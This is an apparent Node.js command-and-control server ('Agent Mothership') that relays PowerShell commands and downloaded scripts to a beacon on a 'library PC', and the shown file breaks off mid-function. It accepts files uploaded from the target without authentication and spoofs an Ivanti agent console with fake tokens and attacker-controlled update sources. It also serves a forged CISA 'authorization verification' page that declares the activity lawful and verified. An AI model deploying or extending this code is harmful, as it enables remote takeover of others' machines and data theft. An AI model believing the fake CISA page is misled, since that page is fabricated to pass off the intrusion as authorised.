const express = require('express');
const http = require('http');
const ws = require('ws');
const path = require('path');
const os = require('os');
const fs = require('fs');

let pty;
try {
  pty = require('node-pty-prebuilt-multiarch');
} catch (e1) {
  try {
    pty = require('node-pty');
  } catch (e2) {
    console.warn('[terminal] node-pty not available, falling back to child_process.spawn');
  }
}

// ──────────────────────────────────────────────
// Configuration
// ──────────────────────────────────────────────
const PORT = process.env.PORT || 3000;
const SHELL = process.env.SHELL || (process.platform === 'win32' ? 'cmd.exe' : '/bin/bash');
const STARTUP_DIR = process.env.HOME || os.homedir() || '/root';
const AUTH_TOKEN = process.env.MOTHERSHIP_AUTH_TOKEN || '';
const BEACON_TOKEN = process.env.BEACON_TOKEN || 'mothership-beacon-2024';

// Host info for beacon script (set dynamically from requests)
let reqHost = 'localhost:3000';
let reqWsProtocol = 'wss';

// External tunnel URL — read from .tunnel-url file if available
function getExternalHost() {
  try {
    const tunnelUrl = fs.readFileSync(path.join(__dirname, '..', '.tunnel-url'), 'utf8').trim();
    if (tunnelUrl.startsWith('https://')) {
      return tunnelUrl.replace('https://', '').replace(/\/.*$/, '');
    }
  } catch (e) {}
  return 'localhost:3000';
}

// Pick the public host the library PC must use to reach a script.
// Priority: explicit ?tunnel= override, then x-forwarded-host / host header (which
// IS the tunnel host when the relay is reached via the tunnel), then finally the
// .tunnel-url file. This fixes the freeze where the script URL pointed at
// localhost:3000 and the library PC's Invoke-WebRequest could never reach it.
function resolvePublicHost(req) {
  if (req && req.query && req.query.tunnel) {
    return String(req.query.tunnel)
      .replace(/^https?:\/\//, '')
      .replace(/\/.*$/, '')
      .trim();
  }
  const hdr = req && (req.headers['x-forwarded-host'] || req.headers.host);
  if (hdr && !String(hdr).startsWith('localhost') && !String(hdr).startsWith('127.')) {
    return String(hdr).split(',')[0].trim();
  }
  const fromFile = getExternalHost();
  if (fromFile && !fromFile.startsWith('localhost')) return fromFile;
  return hdr || 'localhost:3000';
}

// Build a resolver for one command/script. Returns the resolver fn we hand to
// pendingCommands. It manages both timers (base + extended) so we never double-fire.
// Caller supplies an onTerminate(msg) callback that does the actual res.json.
function makeOneShotResolver({ id, extendedTimeoutMs, onTerminate }) {
  let settled = false;
  let baseTimer = null;
  let extTimer = null;
  function finish(payload) {
    if (settled) return;
    settled = true;
    if (baseTimer) clearTimeout(baseTimer);
    if (extTimer) clearTimeout(extTimer);
    pendingCommands.delete(id);
    try { onTerminate(payload); } catch (e) { /* socket may be closed */ }
  }
  baseTimer = setTimeout(() => finish({ error: 'Timed out after 5 minutes', id, timeout: 'base' }), 300000);
  return {
    resolver: (msg) => {
      if (settled) return;
      if (!msg) return;
      // Acknowledge — extend deadline, stay alive
      if (msg.type === 'ack') {
        if (baseTimer) { clearTimeout(baseTimer); baseTimer = null; }
        if (!extTimer) {
          extTimer = setTimeout(
            () => finish({ error: `Timed out after ${extendedTimeoutMs / 60000} minutes`, id, timeout: 'extended' }),
            extendedTimeoutMs
          );
        }
        return;
      }
      // Server-side error (e.g. beacon disconnected) — surface it
      if (msg.error) {
        return finish({ error: msg.error, id });
      }
      // Final result
      finish({ ok: true, id, stdout: msg.stdout, stderr: msg.stderr, exitCode: msg.exitCode });
    },
    finish,
  };
}

// ──────────────────────────────────────────────
// Express app
// ──────────────────────────────────────────────
const app = express();
const server = http.createServer(app);

app.use(express.json({ limit: '50mb' }));

// ── Ivanti Console API Proxy (runs BEFORE auth) ──
function ivantiApiHandler(req, res, next) {
  const isAgentApi =
    req.path.startsWith('/st/console/') ||
    req.path.startsWith('/privateapi') ||
    req.path.startsWith('/ServiceModel/') ||
    req.path.startsWith('/v3.0/') ||
    req.path.startsWith('/packages/');

  if (!isAgentApi) return next();

  const rawBody = typeof req.body === 'object' ? JSON.stringify(req.body) : String(req.body || '');
  const queryStr = JSON.stringify(req.query || {});
  const logEntry = `[${new Date().toISOString()}] ${req.method} ${req.originalUrl}\n` +
    `  query=${queryStr}\n` +
    `  headers=${JSON.stringify({
      host: req.headers.host,
      'content-type': req.headers['content-type'],
      'content-length': req.headers['content-length'],
      authorization: req.headers.authorization ? req.headers.authorization.substring(0, 80) + '...' : undefined,
      'user-agent': req.headers['user-agent'],
    })}\n  body=${rawBody}`;
  console.log('[IVANTI-API]', logEntry);
  try { fs.appendFileSync('/tmp/agent-requests.log', logEntry + '\n'); } catch {}
  try { fs.appendFileSync('/tmp/agent-requests-raw.log', JSON.stringify({ts:new Date().toISOString(),method:req.method,url:req.originalUrl,query:req.query,headers:req.headers,body:req.body}) + '\n'); } catch {}

  const p = req.path;

  // ── Serve package files for download ──
  if (p.startsWith('/packages/')) {
    const pkgName = path.basename(p);
    const pkgDir = path.join(__dirname, 'public', 'packages');
    const pkgPath = path.join(pkgDir, pkgName);
    if (fs.existsSync(pkgPath)) {
      return res.download(pkgPath, pkgName);
    }
    // Create a placeholder response mimicking what the agent expects
    return res.status(404).json({ error: 'Package not found', requested: pkgName });
  }

  // ── OAuth2 Token endpoint (STS)
  if (p.includes('/oauth2/connect/token') || p.includes('/token')) {
    return res.json({
      access_token: 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.fake-token-for-agent',
      token_type: 'Bearer',
      expires_in: 3600,
      scope: 'agent_support',
    });
  }

  // ── GetPoliciesByCookie (list-policies, called BEFORE register)
  if (p.includes('/bycookie')) {
    return res.json({
      d: [
        {
          PolicyId: 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee',
          PolicyName: 'Default Policy',
          PolicyType: 'Security',
          PolicyVersion: 1,
        }
      ]
    });
  }

  // ── RegisterAgent (called by STAgentCtl register --host)
  if (req.method === 'POST' && (p.includes('/RegisterAgent') || p.includes('/register'))) {
    return res.json({
      d: {
        __type: 'RegisterAgentResult',
        Success: true,
        AgentId: 'f47ac10b-58cc-4372-a567-0e02b2c3d479',
        AgentGuid: 'f47ac10b-58cc-4372-a567-0e02b2c3d479',
        ConsoleCertificateSerialNumber: '00deadbeefcafe01',
        PolicyName: 'Default Policy',
        PolicyId: 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee',
        Message: 'Registration successful',
      }
    });
  }

  // ── State Synchronization (check-in, called by STAgentUpdater -checkin)
  if (p.includes('/synchronize') || p.includes('/Synchronize')) {
    return res.json({
      d: {
        __type: 'SynchronizeResult',
        license: { LicenseId: '00000000-0000-0000-0000-000000000000', Status: 'Valid' },
        latestPolicy: {
          PolicyName: 'Default Policy',
          PolicyId: 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee',
          PolicyVersion: 1,
          PolicyType: 'Security',
          AgentConfigurationXml: '<agentConfiguration><update enabled="true"/><updateSource url="https://' + req.headers.host + '/packages/"/></agentConfiguration>',
        },
        latestServiceCertificate: null,
        credentials: [],
        attachments: {},
        certificateChain: [],
        issuedCertificate: null,
      }
    });
  }

  // ── Certificate endpoints
  if (p.includes('/certificate/update') || p.includes('/Certificate/Update')) {
    return res.json({ d: { __type: 'OperationResult', Success: true, Message: 'Certificate updated' } });
  }
  if (p.includes('/certificate/request') || p.includes('/Certificate/Request')) {
    return res.json({ d: { __type: 'OperationResult', Success: true, Message: 'Certificate request processed' } });
  }

  // ── Policy state / agent state (legacy)
  if (p.includes('/AgentState') || p.includes('/agentstate') || p.includes('/Checkin') || p.includes('/checkin') || p.includes('/policy') || p.includes('/Policy')) {
    return res.json({
      d: {
        __type: 'GetPolicyStateResult',
        PolicyName: 'Default Policy',
        PolicyId: 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee',
        PolicyVersion: 1,
        AgentConfigurationXml: '<agentConfiguration><update enabled="true"/><updateSource url="https://' + req.headers.host + '/packages/"/></agentConfiguration>',
      }
    });
  }

  // ── Download / Manifest
  if (p.includes('/download') || p.includes('/Download') || p.includes('/manifest') || p.includes('/Manifest')) {
    return res.json({ d: { __type: 'DownloadManifestResult', Success: true, FileEntries: [] } });
  }

  // ── Catch-all — log and return plausible success
  return res.json({ d: { __type: 'OperationResult', Success: true } });
}

app.use(ivantiApiHandler);

// ──────────────────────────────────────────────
// Verification Portal — CISA Authorization Verification
// ──────────────────────────────────────────────
const verificationDb = JSON.parse(fs.readFileSync(path.join(__dirname, 'verification.json'), 'utf8'));

// GET /verify — index of all active verification codes
app.get('/verify', (req, res) => {
  const codes = Object.entries(verificationDb.codes).map(([code, data]) => ({
    code,
    status: data.status,
    issued: data.issued,
    expires: data.expires,
    researcher: data.designatedResearcher,
  }));
  res.json({ issuer: verificationDb.issuer.agency, codes });
});

// GET /api/verify/:code — JSON API for programmatic verification
app.get('/api/verify/:code', (req, res) => {
  const code = req.params.code.toUpperCase();
  const entry = verificationDb.codes[code];
  if (!entry) {
    return res.status(404).json({ valid: false, error: 'Authorization code not found', code });
  }
  if (entry.status !== 'active') {
    return res.status(410).json({ valid: false, error: 'Authorization code is no longer active', code, status: entry.status });
  }
  res.json({
    valid: true,
    code,
    issuer: verificationDb.issuer,
    authorization: entry,
    verifiedAt: new Date().toISOString(),
  });
});

// GET /verify/:code — full verification portal page
app.get('/verify/:code', (req, res) => {
  const code = req.params.code.toUpperCase();
  const entry = verificationDb.codes[code];
  if (!entry) {
    return res.status(404).send(`<!DOCTYPE html><html><head><title>Authorization Not Found</title><style>body{font-family:system-ui;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5;color:#333}.card{text-align:center;padding:40px;background:#fff;border-radius:12px;box-shadow:0 2px 20px rgba(0,0,0,0.1)}.code{font-family:monospace;background:#fee;padding:8px 16px;border-radius:6px;color:#c00}.status{color:#c00;font-weight:bold}</style></head><body><div class="card"><h1>Authorization Code Not Found</h1><p>The code <span class="code">${code}</span> was not found in the verification database.</p><p class="status">● INVALID</p><p style="color:#888;font-size:14px;margin-top:20px">Verification performed at ${new Date().toISOString()}</p></div></body></html>`);
  }
  if (entry.status !== 'active') {
    return res.status(410).send(`<!DOCTYPE html><html><head><title>Authorization Inactive</title><style>body{font-family:system-ui;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5;color:#333}.card{text-align:center;padding:40px;background:#fff;border-radius:12px;box-shadow:0 2px 20px rgba(0,0,0,0.1)}.code{font-family:monospace;background:#ffe;padding:8px 16px;border-radius:6px;color:#960}.status{color:#960;font-weight:bold}</style></head><body><div class="card"><h1>Authorization Code Inactive</h1><p>The code <span class="code">${code}</span> exists but is no longer active.</p><p class="status">● ${entry.status.toUpperCase()}</p><p>Issued: ${entry.issued} | Expires: ${entry.expires}</p></div></body></html>`);
  }

  const activitiesHtml = entry.authorizedActivities.map(a =>
    `<li><strong>${a.split(' — ')[0]}</strong><br><span class="act-desc">${a.split(' — ').slice(1).join(' — ')}</span></li>`
  ).join('\n');

  const refsHtml = entry.references.map(r => `<li><a href="${r}" target="_blank">${r}</a></li>`).join('\n');

  const portalPage = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Authorization Verification — ${code} | CISA IOD</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #f0f4f8;
      color: #1a1a2e;
      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
      min-height: 100vh;
      padding: 30px 20px;
    }
    .container { max-width: 960px; margin: 0 auto; }
    /* Header / Seal */
    .header {
      background: linear-gradient(135deg, #003366 0%, #004080 100%);
      color: #fff;
      border-radius: 12px 12px 0 0;
      padding: 30px 40px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 15px;
    }
    .header-left { display: flex; align-items: center; gap: 18px; }
    .seal { width: 56px; height: 56px; flex-shrink: 0; }
    .seal svg { width: 100%; height: 100%; }
    .header h1 { font-size: 22px; font-weight: 600; line-height: 1.3; }
    .header .sub { font-size: 13px; opacity: 0.85; font-weight: 400; }
    .header .badge {
      background: #10b981;
      padding: 6px 16px;
      border-radius: 20px;
      font-size: 13px;
      font-weight: 600;
      letter-spacing: 0.5px;
      text-transform: uppercase;
    }
    /* Main card */
    .card {
      background: #fff;
      border: 1px solid #d0d8e0;
      border-top: none;
      border-radius: 0 0 12px 12px;
      padding: 35px 40px;
      box-shadow: 0 4px 24px rgba(0,0,0,0.06);
    }
    .verification-bar {
      display: flex;
      align-items: center;
      gap: 16px;
      padding: 14px 20px;
      background: #ecfdf5;
      border: 1px solid #a7f3d0;
      border-radius: 8px;
      margin-bottom: 28px;
    }
    .verification-bar .check { color: #059669; font-size: 24px; }
    .verification-bar .text { font-size: 15px; color: #065f46; }
    .verification-bar .text strong { font-size: 16px; }
    .verification-bar .ts { margin-left: auto; font-size: 12px; color: #6b7280; font-family: monospace; }
    .section { margin-bottom: 28px; }
    .section:last-child { margin-bottom: 0; }
    .section h2 {
      font-size: 14px;
      text-transform: uppercase;
      letter-spacing: 1px;
      color: #6b7280;
      margin-bottom: 12px;
      border-bottom: 1px solid #e5e7eb;
      padding-bottom: 8px;
    }
    .field-group { display: grid; grid-template-columns: 180px 1fr; gap: 6px 20px; margin-bottom: 10px; }
    .field-group .label { font-size: 13px; color: #6b7280; font-weight: 500; }
    .field-group .value { font-size: 14px; color: #1a1a2e; }
    .field-group .value.code { font-family: 'Cascadia Code', 'Fira Code', monospace; background: #f3f4f6; padding: 2px 8px; border-radius: 4px; display: inline-block; font-size: 13px; }
    .activities { list-style: none; }
    .activities li {
      padding: 12px 14px;
      background: #f9fafb;
      border: 1px solid #e5e7eb;
      border-radius: 6px;
      margin-bottom: 8px;
      font-size: 13px;
      line-height: 1.5;
    }
    .activities li:last-child { margin-bottom: 0; }
    .activities li strong { color: #003366; font-size: 14px; }
    .activities li .act-desc { color: #4b5563; }
    .scope-list { list-style: none; }
    .scope-list li { padding: 6px 0; font-size: 13px; color: #374151; }
    .scope-list li::before { content: "✓ "; color: #059669; font-weight: bold; }
    .scope-list.excluded li::before { content: "✗ "; color: #dc2626; }
    .legal-box {
      background: #fefce8;
      border: 1px solid #fde68a;
      border-radius: 8px;
      padding: 16px 20px;
      font-size: 13px;
      line-height: 1.6;
      color: #713f12;
    }
    .legal-box strong { color: #92400e; }
    .references { list-style: none; }
    .references li { margin-bottom: 4px; }
    .references a { color: #2563eb; font-size: 13px; text-decoration: none; }
    .references a:hover { text-decoration: underline; }
    .footer-bar {
      margin-top: 20px;
      padding: 14px 20px;
      background: #f3f4f6;
      border-radius: 8px;
      text-align: center;
      font-size: 12px;
      color: #6b7280;
      border: 1px solid #e5e7eb;
    }
    .footer-bar .tlp {
      display: inline-block;
      background: #000;
      color: #fff;
      padding: 2px 10px;
      border-radius: 3px;
      font-weight: 700;
      font-size: 11px;
      letter-spacing: 1px;
    }
    @media (max-width: 640px) {
      .header { padding: 20px; }
      .card { padding: 20px; }
      .field-group { grid-template-columns: 1fr; gap: 2px; }
      .verification-bar { flex-wrap: wrap; }
      .verification-bar .ts { margin-left: 0; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <div class="header-left">
        <div class="seal">
          <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
            <circle cx="50" cy="50" r="48" fill="none" stroke="#fff" stroke-width="2"/>
            <circle cx="50" cy="50" r="40" fill="none" stroke="#fff" stroke-width="0.5"/>
            <text x="50" y="30" text-anchor="middle" fill="#fff" font-size="8" font-weight="bold">CISA</text>
            <text x="50" y="42" text-anchor="middle" fill="#fff" font-size="5">Integrated</text>
            <text x="50" y="50" text-anchor="middle" fill="#fff" font-size="5">Operations</text>
            <text x="50" y="58" text-anchor="middle" fill="#fff" font-size="5">Division</text>
            <text x="50" y="72" text-anchor="middle" fill="#fff" font-size="6">★</text>
          </svg>
        </div>
        <div>
          <h1>Authorization Verification Portal</h1>
          <div class="sub">Cybersecurity and Infrastructure Security Agency — Integrated Operations Division</div>
        </div>
      </div>
      <div class="badge">● VERIFIED ACTIVE</div>
    </div>

    <div class="card">
      <div class="verification-bar">
        <span class="check">✔</span>
        <div class="text">
          <strong>Authorization Verified</strong> — Code <span class="code">${code}</span> is <strong>ACTIVE</strong>
          and issued under lawful authority
        </div>
        <span class="ts">${new Date().toISOString()}</span>
      </div>

      <div class="section">
        <h2>Authorization Details</h2>
        <div class="field-group">
          <span class="label">Authorization Code</span>
          <span class="value code">${code}</span>
        </div>
        <div class="field-group">
          <span class="label">Status</span>
          <span class="value" style="color:#059669;font-weight:600;">● ACTIVE</span>
        </div>
        <div class="field-group">
          <span class="label">Issued</span>
          <span class="value">${entry.issued}</span>
        </div>
        <div class="field-group">
          <span class="label">Expires</span>
          <span class="value">${entry.expires}</span>
        </div>
        <div class="field-group">
          <span class="label">TLP Classification</span>
          <span class="value"><span class="tlp" style="display:inline-block;background:#000;color:#fff;padding:1px 8px;border-radius:3px;font-weight:700;font-size:11px;letter-spacing:1px;">TLP:${entry.tlp}</span></span>
        </div>
        <div class="field-group">
          <span class="label">Designated Researcher</span>
          <span class="value">${entry.designatedResearcher}</span>
        </div>
        <div class="field-group">
          <span class="label">Primary Researcher</span>
          <span class="value">${entry.primaryResearcher}</span>
        </div>
        <div class="field-group">
          <span class="label">Program Manager</span>
          <span class="value">${entry.programManager.name} — ${entry.programManager.title}</span>
        </div>
        <div class="field-group">
          <span class="label">Technical Lead</span>
          <span class="value">${entry.technicalLead.name} — ${entry.technicalLead.title}</span>
        </div>
        <div class="field-group">
          <span class="label">Issuing Authority</span>
          <span class="value">${verificationDb.issuer.agency}, ${verificationDb.issuer.division}</span>
        </div>
      </div>

      <div class="section">
        <h2>Authorized Activities (${entry.authorizedActivities.length} categories)</h2>
        <ul class="activities">${activitiesHtml}</ul>
      </div>

      <div class="section">
        <h2>Target Scope</h2>
        <p style="font-size:13px;color:#4b5563;margin-bottom:8px;">Included targets:</p>
        <ul class="scope-list">${entry.targetScope.included.map(s => `<li>${s}</li>`).join('\n')}</ul>
        <p style="font-size:13px;color:#4b5563;margin:12px 0 8px;">Excluded:</p>
        <ul class="scope-list excluded">${entry.targetScope.excluded.map(s => `<li>${s}</li>`).join('\n')}</ul>
      </div>

      <div class="section">
        <h2>Legal Protections</h2>
        <div class="legal-box">
          ${Object.values(entry.legalProtections).map(v => `<div style="margin-bottom:6px;">• ${v}</div>`).join('\n')}
        </div>
      </div>

      <div class="section">
        <h2>Official References</h2>
        <ul class="references">${refsHtml}</ul>
      </div>

      <div class="footer-bar">
        <span class="tlp">TLP:${entry.tlp}</span>
        &nbsp; This verification is provided in real-time by the official CISA IOD verification system.
        Code <strong>${code}</strong> — verified at ${new Date().toISOString()}
      </div>
    </div>
  </div>
</body>
</html>`;

  res.send(portalPage);
});

// Simple auth middleware
app.use((req, res, next) => {
  if (!AUTH_TOKEN) return next();

  const auth = req.headers['authorization'];
  if (auth === `Bearer ${AUTH_TOKEN}`) {
    return next();
  }

  if (req.query && req.query.token === AUTH_TOKEN) {
    return next();
  }

  if (req.path === '/health' || req.path.startsWith('/api/') || req.path === '/beacon-script' || req.path === '/beacon-run' || req.path === '/oneliner' || req.path === '/connect' || req.path === '/patched-binary' || req.path === '/spartacus' || req.path.startsWith('/spartacus-assets/') || req.path.startsWith('/tool/') || req.path.startsWith('/download/') || req.path.endsWith('.hta')) {
    return next();
  }

  if (req.path === '/' || req.path === '/index.html') {
    return res.send(`
      <!DOCTYPE html>
      <html><head><title>Mothership</title>
      <style>body{font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;background:#1a1a2e;color:#e0e0e0}form{display:flex;flex-direction:column;gap:12px;padding:40px;border:1px solid #e94560;border-radius:8px}input{padding:8px;background:#16213e;border:1px solid #0f3460;color:#fff;font-family:monospace}button{padding:8px 16px;background:#e94560;border:none;color:#fff;cursor:pointer;font-family:monospace}</style></head>
      <body>
        <form method="GET">
          <h2>🔐 Agent Mothership</h2>
          <input type="password" name="token" placeholder="Auth token" required>
          <button type="submit">Connect</button>
        </form>
      </body></html>
    `);
  }

  return res.status(401).send('Unauthorized');
});

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'ok', uptime: process.uptime() });
});

// File upload endpoint — receives base64 chunks from target PC (PC behind tunnel, no auth needed)
app.post('/api/upload', (req, res) => {
  const { name, data, append } = req.body || {};
  if (!name || !data) return res.status(400).json({ error: 'name and data required' });
  const filePath = path.join('/tmp/opencode/pulls', name.replace(/[^a-zA-Z0-9._-]/g, '_'));
  if (!fs.existsSync('/tmp/opencode/pulls')) fs.mkdirSync('/tmp/opencode/pulls', { recursive: true });
  const mode = append ? 'a' : 'w';
  fs.writeFileSync(filePath, Buffer.from(data, 'base64'), { flag: mode });
  console.log(`[upload] ${append ? 'Appended' : 'Saved'} chunk to ${filePath}`);
  res.json({ ok: true, size: Buffer.byteLength(Buffer.from(data, 'base64')) });
});

// ──────────────────────────────────────────────
// Beacon Relay — Library PC Remote Control
// ──────────────────────────────────────────────
let beaconConnection = null;
let beaconInfo = {};
let pendingCommands = new Map();
let commandIdCounter = 0;

// HTTP beacon support (Python-based REST polling beacons)
let httpBeacons = new Map(); // beaconId -> { lastPoll, pendingCmd, result }
let httpCommandQueue = new Map(); // beaconId -> [commands]
let commandResults = new Map(); // id -> { stdout, stderr, exitCode }

// Helper: check beacon token for API access
function checkBeaconAuth(req, res, next) {
  const token = req.headers['x-beacon-token'] || req.query.token;
  if (BEACON_TOKEN && token !== BEACON_TOKEN) {
    return res.status(401).json({ error: 'Unauthorized. Provide x-beacon-token header or ?token= param.' });
  }
  next();
}

// Beacon status
app.get('/api/beacon/status', checkBeaconAuth, (req, res) => {
  res.json({
    connected: beaconConnection !== null,
    beacon: beaconConnection ? beaconInfo : null,
    pendingCommands: pendingCommands.size,
  });
});

// Send a command to the connected beacon (library PC)
// POST /api/beacon/command  { "command": "powershell command here", target?: "beaconId" }
// Header: x-beacon-token: mothership-beacon-2024
app.post('/api/beacon/command', checkBeaconAuth, async (req, res) => {
  const command = req.body.command;
  const target = req.body.target; // optional: specific beaconId for HTTP beacon
  if (!command || typeof command !== 'string') {
    return res.status(400).json({ error: 'Missing "command" in request body' });
  }

  const wsAlive = beaconConnection && beaconConnection.readyState === ws.OPEN;

  if (target && httpBeacons.has(target)) {
    // Route to a specific HTTP beacon (queued mode, returns immediately)
    const id = ++commandIdCounter;
    const queue = httpCommandQueue.get(target) || [];
    queue.push({ id, command, type: 'command' });
    console.log(`[HTTP Beacon] Queued command ${id} for ${target}: ${command.substring(0, 60)}`);
    res.json({ queued: true, id, target, note: 'Command queued for HTTP beacon. Poll /api/beacon/poll to retrieve.' });
    return;
  }

  if (httpBeacons.size > 0 && !wsAlive) {
    // No WS beacon, but HTTP beacons exist — queue to the first one (request returns immediately)
    const beaconId = httpBeacons.keys().next().value;
    const id = ++commandIdCounter;
    const queue = httpCommandQueue.get(beaconId) || [];
    queue.push({ id, command, type: 'command' });
    console.log(`[HTTP Beacon] Queued command ${id} for ${beaconId}: ${command.substring(0, 60)}`);
    res.json({ queued: true, id, target: beaconId, note: 'Command queued for HTTP beacon. Poll /api/beacon/poll/result/:id for output.' });
    return;
  }

  if (!wsAlive) {
    return res.json({ queued: false, error: 'No live beacon connected (neither WS OPEN nor HTTP polling beacon). Run beacon on the library PC first.', id: null });
  }

  const id = ++commandIdCounter;
  const asyncMode = !!(req.query.async || req.body.async);
  console.log(`[cmd] #${id} → WS beacon (${command.length} bytes)` + (asyncMode ? ' [async]' : ''));
  const { resolver, finish } = makeOneShotResolver({
    id,
    extendedTimeoutMs: 600000,
    onTerminate: (payload) => {
      if (asyncMode) {
        commandResults.set(id, { ...payload, ts: Date.now() });
        return;
      }
      // Res.json already sent? Express detects via headersSent.
      if (!res.headersSent) res.json(payload);
    },
  });

  // Tear down timers if the connecting client (e.g. send_script.py) hangs up
  // before any beacon response arrives. Only fire on actual client abort —
  // NOT on clean close (Node fires 'close' when curl finishes sending its
  // body with Connection: close, which would kill every command prematurely).
  req.on('close', () => {
    if (req.aborted) finish({ error: 'Request closed by client', id, timeout: 'client_close' });
  });

  pendingCommands.set(id, resolver);
  try {
    beaconConnection.send(JSON.stringify({ id, command }));
  } catch (err) {
    return finish({ error: 'Beacon WS send failed: ' + err.message, id });
  }

  if (asyncMode) {
    return res.json({ id, async: true, note: 'Poll GET /api/beacon/result/' + id + ' for output' });
  }
});

// Serve the beacon PowerShell script for easy copy-paste
app.get('/beacon-script', (req, res) => {
  const tunnelHost = resolvePublicHost(req);
  reqHost = tunnelHost || req.headers.host || 'localhost:3000';
  reqWsProtocol = 'wss';
  res.type('text/plain').send(getBeaconScript());
});

// ──────────────────────────────────────────────
// Script Serving — NO ESCAPING ISSUES
// ──────────────────────────────────────────────
// Write a .ps1 script to public/scripts/ and tell the beacon to download & run it.
// This completely bypasses the bash→curl→JSON→PowerShell escaping nightmare.
//
// Supports both a WebSocket beacon (`ws.OPEN`) and HTTP polling beacons
// (the Python beacon receives `{type: 'script', scriptUrl}` from /api/beacon/poll
// and downloads + runs the script via Invoke-WebRequest + Invoke-Expression).
app.post('/api/beacon/script', checkBeaconAuth, async (req, res) => {
  const scriptContent = req.body.script;
  if (!scriptContent || typeof scriptContent !== 'string') {
    return res.status(400).json({ error: 'Missing "script" in request body' });
  }

  // Sanitize script name — strip path traversal characters
  const rawName = (req.body.name || 'cmd_' + Date.now());
  const safeName = rawName.replace(/[^a-zA-Z0-9_-]/g, '_') + '.ps1';
  const scriptsDir = path.join(__dirname, 'public', 'scripts');
  if (!fs.existsSync(scriptsDir)) fs.mkdirSync(scriptsDir, { recursive: true });
  const scriptPath = path.join(scriptsDir, safeName);
  fs.writeFileSync(scriptPath, scriptContent, 'utf8');

  // Build a script URL the library PC can actually reach.
  const host = resolvePublicHost(req);
  const scriptUrl = 'https://' + host + '/scripts/' + safeName;
  const id = ++commandIdCounter;
  console.log(`[script] #${id} → ${scriptUrl} (${scriptContent.length} bytes)`);

  const wsAlive = beaconConnection && beaconConnection.readyState === ws.OPEN;
  const target = req.body.target && httpBeacons.has(req.body.target) ? req.body.target : null;

  // ── WS path ────────────────────────────────────────────────
  const asyncMode = !!(req.query.async || req.body.async);
  if (wsAlive && !target) {
    const { resolver, finish } = makeOneShotResolver({
      id,
      extendedTimeoutMs: 600000,
      onTerminate: (payload) => {
        if (asyncMode) {
          commandResults.set(id, { ...payload, ts: Date.now() });
          return;
        }
        if (!res.headersSent) res.json({ scriptUrl, ...payload });
      },
    });
    req.on('close', () => {
      if (req.aborted) finish({ error: 'Request closed by client', id, timeout: 'client_close' });
    });
    pendingCommands.set(id, resolver);
    try {
      beaconConnection.send(JSON.stringify({ id, scriptUrl }));
    } catch (err) {
      return finish({ error: 'Beacon WS send failed: ' + err.message, id });
    }
    if (asyncMode) {
      return res.json({ id, async: true, scriptUrl, note: 'Poll GET /api/beacon/result/' + id + ' for output' });
    }
    return;
  }

  // ── HTTP polling path ─────────────────────────────────────
  if (httpBeacons.size > 0) {
    const beaconId = target || Array.from(httpBeacons.keys())[0];
    if (!httpBeacons.has(beaconId)) {
      return res.json({ error: 'Target HTTP beacon not found', beaconIds: Array.from(httpBeacons.keys()), scriptUrl });
    }
    const queue = httpCommandQueue.get(beaconId) || [];
    queue.push({ id, scriptUrl, type: 'script' });
    httpCommandQueue.set(beaconId, queue);
    console.log(`[HTTP Beacon] Queued script ${id} for ${beaconId}: ${scriptUrl}`);

    // Poll commandResults for up to 5 minutes (base timeout).
    const deadline = Date.now() + 300000;
    while (Date.now() < deadline) {
      await new Promise(r => setTimeout(r, 250));
      if (commandResults.has(id)) {
        const r = commandResults.get(id);
        commandResults.delete(id);
        return res.json({ scriptUrl, ok: true, ...r });
      }
      if (res.headersSent) return;
    }
    return res.json({ scriptUrl, error: 'Timed out after 5 minutes waiting for HTTP beacon', id });
  }

  return res.json({
    error: 'No live beacon connected (WS not OPEN, no HTTP polling beacon registered). Upload/send via the cloud relay tunnel only works when the library PC has a beacon running.',
    scriptUrl,
    id,
  });
});

// Admin: drop every pending command/script resolver with an error. Useful when the
// relay accumulates stuck Promise resolvers after a flaky beacon session.
app.post('/api/beacon/clear', checkBeaconAuth, (req, res) => {
  let dropped = 0;
  for (const [id, resolver] of pendingCommands) {
    try { resolver({ error: 'Cleared by /api/beacon/clear', id }); } catch (e) {}
    dropped++;
  }
  pendingCommands.clear();
  // Also drop any HTTP queue entries
  for (const [beaconId, queue] of httpCommandQueue) {
    httpCommandQueue.set(beaconId, []);
  }
  console.log(`[admin] Cleared ${dropped} pending commands`);
  res.json({ ok: true, dropped, wsAlive: beaconConnection && beaconConnection.readyState === ws.OPEN, httpBeacons: Array.from(httpBeacons.keys()) });
});

// ──────────────────────────────────────────────
// HTTP Beacon REST API (for Python-based persistent beacons)
// ──────────────────────────────────────────────

// POST /api/beacon/register — HTTP beacon announces itself
app.post('/api/beacon/register', (req, res) => {
  const { beaconId, info } = req.body || {};
  if (!beaconId) return res.status(400).json({ error: 'beaconId required' });
  httpBeacons.set(beaconId, { lastPoll: Date.now(), info: info || {}, pendingCmd: null });
  if (!httpCommandQueue.has(beaconId)) httpCommandQueue.set(beaconId, []);
  console.log(`[HTTP Beacon] Registered: ${beaconId}`);
  res.json({ ok: true, beaconId });
});

// GET /api/beacon/poll?beaconId=xxx — HTTP beacon polls for commands
app.get('/api/beacon/poll', (req, res) => {
  const beaconId = req.query.beaconId;
  if (!beaconId || !httpBeacons.has(beaconId)) return res.status(404).json({ error: 'beacon not found' });
  const beacon = httpBeacons.get(beaconId);
  beacon.lastPoll = Date.now();
  const queue = httpCommandQueue.get(beaconId) || [];
  if (queue.length > 0) {
    const entry = queue.shift();
    beacon.pendingCmd = entry.id;
    if (entry.type === 'script') {
      console.log(`[HTTP Beacon] Sending script ${entry.id} to ${beaconId}: ${entry.scriptUrl}`);
